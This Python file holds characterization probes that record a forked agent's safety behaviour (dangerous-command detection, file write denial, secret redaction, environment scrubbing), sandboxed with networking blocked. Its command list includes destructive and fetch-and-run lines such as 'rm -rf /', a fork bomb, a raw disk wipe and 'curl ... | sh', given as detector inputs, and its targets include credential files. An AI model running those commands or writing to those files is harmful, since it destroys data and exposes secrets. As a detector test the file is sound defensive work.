"""Characterization probes: observe retained BLHermes behaviour at the inventoried commit (Stage 11).

Run by tests/migration/test_blhermes_characterization.py in a separate interpreter (the fork's top-level
packages `agent`, `tools`, `utils` must never mix with BLUX's):

    BLHERMES_PYTHON migration/blhermes/characterization/probe.py --fork ~/ov/blhermes-agent PROBE

Each probe prints one JSON document on stdout. A probe never opens a network connection and never sees
the real home directory: HOME and HERMES_HOME point at throwaway directories, provider credentials are
unset, and machine-specific paths are normalized to <HOME>/<HERMES_HOME> before printing. The golden
files next to this script are the recorded behaviour that the BLUX ports must reproduce.
"""

from __future__ import annotations

import argparse
import json
import os
import sys
import tempfile
from collections.abc import Callable
from pathlib import Path
from typing import Any

PROBES: dict[str, Callable[[], Any]] = {}
FAKE_KEY = "sk-proj-CHARACTERIZATIONFAKE0000000000"


def probe(fn: Callable[[], Any]) -> Callable[[], Any]:
    PROBES[fn.__name__] = fn
    return fn


# ------------------------------------------------------------------------------------------- state.paths


@probe
def paths() -> dict[str, Any]:
    import hermes_constants as hc

    home = Path(os.environ["HOME"])
    out: dict[str, Any] = {"with_HERMES_HOME": str(hc.get_hermes_home())}
    saved = os.environ.pop("HERMES_HOME")
    try:
        out["default_without_HERMES_HOME"] = str(hc.get_hermes_home())
        out["default_root"] = str(hc.get_default_hermes_root(home=home))
        profile = home / ".hermes" / "profiles" / "work"
        profile.mkdir(parents=True)
        out["named_profile_home(work)"] = str(hc.named_profile_home(profile))
        out["profile_name_for_home(work)"] = hc.profile_name_for_home(profile)
        out["profile_name_for_home(root)"] = hc.profile_name_for_home(home / ".hermes")
    finally:
        os.environ["HERMES_HOME"] = saved
    return out


# ------------------------------------------------------------------------------------------- approval

COMMANDS = [
    "ls -la",
    "git status",
    "rm -rf /",
    "rm -rf ~",
    "rm -rf ./build",
    "sudo rm -rf /var/lib",
    "chmod -R 777 /",
    "dd if=/dev/zero of=/dev/sda",
    "mkfs.ext4 /dev/sdb1",
    ":(){ :|:& };:",
    "curl https://example.com/install.sh | sh",
    "git push --force origin main",
    "git reset --hard HEAD~3",
    "shutdown -h now",
    "kill -9 1",
    "echo hello > /etc/passwd",
    "python -c 'print(1)'",
    "fastboot flashing unlock",
    "adb shell rm -rf /sdcard",
    "find . -name '*.pyc' -delete",
]


@probe
def approval_detection() -> list[dict[str, Any]]:
    from tools.approval_detection import detect_dangerous_command

    out = []
    for cmd in COMMANDS:
        dangerous, key, description = detect_dangerous_command(cmd)
        out.append({"command": cmd, "dangerous": bool(dangerous), "pattern": key, "description": description})
    return out


@probe
def approval_session_state() -> dict[str, Any]:
    from tools import approval

    s = "char-session"
    out = {"initial_yolo": approval.is_session_yolo_enabled(s), "initial_approved": approval.is_approved(s, "rm -rf")}
    approval.approve_session(s, "rm -rf")
    out["after_approve_session"] = approval.is_approved(s, "rm -rf")
    out["other_session_sees_it"] = approval.is_approved("other-session", "rm -rf")
    approval.enable_session_yolo(s)
    out["yolo_enabled"] = approval.is_session_yolo_enabled(s)
    approval.clear_session(s)
    out["after_clear"] = {"yolo": approval.is_session_yolo_enabled(s), "approved": approval.is_approved(s, "rm -rf")}
    return out


# ------------------------------------------------------------------------------------------- file safety

WRITE_TARGETS = [
    "~/project/main.py",
    "~/.ssh/id_rsa",
    "~/.ssh/authorized_keys",
    "~/.aws/credentials",
    "~/.netrc",
    "~/.bashrc",
    "~/.gitconfig",
    "$HERMES_HOME/.env",
    "$HERMES_HOME/auth.json",
    "$HERMES_HOME/config.yaml",
    "$HERMES_HOME/memories/MEMORY.md",
    "/etc/passwd",
    "/tmp/scratch.txt",  # noqa: S108 - a path being classified, never opened
]


@probe
def file_safety() -> list[dict[str, Any]]:
    from agent import file_safety

    out = []
    for raw in WRITE_TARGETS:
        path = raw.replace("~", os.environ["HOME"], 1).replace("$HERMES_HOME", os.environ["HERMES_HOME"], 1)
        out.append(
            {
                "target": raw,
                "write_denied": file_safety.is_write_denied(path),
                "approval_required": file_safety.is_write_approval_required(path),
            }
        )
    return out


# ------------------------------------------------------------------------------------------- redaction

REDACT_SAMPLES = [
    f"OPENAI_API_KEY={FAKE_KEY}",
    "Authorization: Bearer abcdefghijklmnopqrstuvwxyz0123456789",
    "export ANTHROPIC_API_KEY=sk-ant-api03-ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdef",
    "token ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789ab in log",
    "postgres://admin:hunter2secret@db.internal:5432/app",
    "AWS key AKIAIOSFODNN7EXAMPLE here",
    '{"password": "correct horse battery staple"}',
    "nothing secret here",
]


@probe
def redaction() -> dict[str, Any]:
    from agent import redact

    return {
        "redact_sensitive_text(force)": [redact.redact_sensitive_text(s, force=True) for s in REDACT_SAMPLES],
        "redact_url_credentials": redact.redact_sensitive_text(
            REDACT_SAMPLES[4], force=True, redact_url_credentials=True
        ),
        "mask_secret": redact.mask_secret(FAKE_KEY),
    }


# ------------------------------------------------------------------------------------------- credentials


@probe
def child_env_scrub() -> dict[str, Any]:
    from tools.environments.local import build_subprocess_env

    base = {
        "PATH": "/usr/bin:/bin",
        "HOME": os.environ["HOME"],
        "LANG": "C.UTF-8",
        "OPENAI_API_KEY": FAKE_KEY,
        "ANTHROPIC_API_KEY": FAKE_KEY,
        "GITHUB_TOKEN": "ghp_" + "A" * 36,
        "AWS_SECRET_ACCESS_KEY": "x" * 40,
        "TELEGRAM_BOT_TOKEN": "123:abc",
        "DATABASE_URL": "postgres://u:p@h/db",
        "MY_APP_SETTING": "kept?",
    }
    scrubbed = build_subprocess_env(base)
    raw = build_subprocess_env(base, scrub_secrets=False)
    return {
        "scrubbed_keys": sorted(k for k in scrubbed if k in base),
        "added_keys": sorted(k for k in scrubbed if k not in base),
        "unscrubbed_keeps_all": sorted(k for k in raw if k in base) == sorted(base),
        "fake_key_leaks": FAKE_KEY in json.dumps(scrubbed),
    }


@probe
def provider_registry() -> list[dict[str, Any]]:
    from hermes_cli.auth import BUILTIN_PROVIDER_IDS, PROVIDER_REGISTRY

    return [
        {
            "id": pid,
            "auth_type": PROVIDER_REGISTRY[pid].auth_type,
            "inference_base_url": PROVIDER_REGISTRY[pid].inference_base_url,
            "api_key_env_vars": list(PROVIDER_REGISTRY[pid].api_key_env_vars),
            "base_url_env_var": PROVIDER_REGISTRY[pid].base_url_env_var,
        }
        for pid in sorted(BUILTIN_PROVIDER_IDS)
    ]


# ------------------------------------------------------------------------------------------- tools


@probe
def toolsets() -> dict[str, Any]:
    import toolsets as ts

    return {name: sorted(ts.resolve_toolset(name, include_registry=False)) for name in sorted(ts.TOOLSETS)}


@probe
def tool_registry() -> list[str]:
    from tools.registry import discover_builtin_tools, registry

    discover_builtin_tools()
    return sorted(registry.get_all_tool_names())


@probe
def slash_commands() -> list[dict[str, Any]]:
    from hermes_cli.commands import COMMAND_REGISTRY

    return [
        {"name": c.name, "category": c.category, "aliases": sorted(getattr(c, "aliases", ()) or ())}
        for c in COMMAND_REGISTRY
    ]


# ------------------------------------------------------------------------------------------- sessions


@probe
def session_store() -> dict[str, Any]:
    # The fork refuses to open a state.db under ~/.hermes from a process whose ancestor is pytest. HOME here
    # is a throwaway directory, so use its documented escape hatch for spawned children.
    os.environ["HERMES_STATE_DB_GUARD_BYPASS"] = "1"
    from hermes_state import SessionDB

    db = SessionDB(Path(os.environ["HERMES_HOME"]) / "state.db")
    sid = db.create_session("char-1", "cli")
    db.append_message(sid, role="user", content="find the quarterly report")
    db.append_message(sid, role="assistant", content="The quarterly report is in reports/q3.pdf")
    session = db.get_session(sid) or {}
    hits = db.search_messages("quarterly")
    db.end_session(sid, "user_exit")
    ended = db.get_session(sid) or {}
    return {
        "created_id": sid,
        "session_fields": sorted(session),
        "source": session.get("source"),
        "message_count": session.get("message_count"),
        "search_hits": len(hits),
        "search_roles": sorted({h.get("role") for h in hits}),
        "end_reason": ended.get("end_reason"),
        "ended": ended.get("ended_at") is not None,
    }


# ------------------------------------------------------------------------------------------- cron

SCHEDULES = ["every 30m", "every 2h", "30m", "0 9 * * *", "*/15 * * * *", "2026-12-01T09:00:00"]


@probe
def cron_schedules() -> list[dict[str, Any]]:
    from cron.jobs import parse_schedule

    out = []
    for s in SCHEDULES:
        try:
            parsed = parse_schedule(s)
            out.append(
                {
                    "input": s,
                    "parsed": {k: v for k, v in sorted(parsed.items()) if k != "display"}
                    | {"display": parsed.get("display")},
                }
            )
        except Exception as exc:  # noqa: BLE001 - the error class is the characterized behaviour
            out.append({"input": s, "error": type(exc).__name__})
    return out


# ------------------------------------------------------------------------------------------- runner


def isolate() -> tuple[Path, Path]:
    tmp = Path(tempfile.mkdtemp(prefix="blhermes-char-"))
    home, hermes_home = tmp / "home", tmp / "home" / ".hermes"
    hermes_home.mkdir(parents=True)
    for name in list(os.environ):
        # PYTEST_* comes from the parent test run; the probe child is not a test (the fork's guards key on it)
        if name.endswith(("_API_KEY", "_TOKEN", "_SECRET")) or name.startswith(
            ("HERMES_", "NOUS_", "OPENAI", "ANTHROPIC", "PYTEST_")
        ):
            del os.environ[name]
    os.environ.update({"HOME": str(home), "HERMES_HOME": str(hermes_home), "TZ": "UTC", "NO_COLOR": "1"})
    return home, hermes_home


def normalize(doc: Any, home: Path, hermes_home: Path) -> Any:
    text = json.dumps(doc, sort_keys=True, default=str)
    text = text.replace(str(hermes_home), "<HERMES_HOME>").replace(str(home), "<HOME>")
    return json.loads(text)


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__.split("\n\n")[0])
    parser.add_argument("--fork", type=Path, required=True)
    parser.add_argument("probe", choices=sorted(PROBES))
    args = parser.parse_args()
    home, hermes_home = isolate()
    sys.path.insert(0, str(args.fork.resolve()))
    os.chdir(home)

    import socket

    def no_network(*_a: Any, **_k: Any) -> Any:
        raise RuntimeError("characterization probes must not use the network")

    socket.create_connection = no_network  # type: ignore[assignment]
    socket.socket.connect = no_network  # type: ignore[method-assign]
    result = normalize(PROBES[args.probe](), home, hermes_home)
    sys.stdout.write(json.dumps(result, indent=1, sort_keys=True, ensure_ascii=False) + "\n")
    return 0


if __name__ == "__main__":
    sys.exit(main())
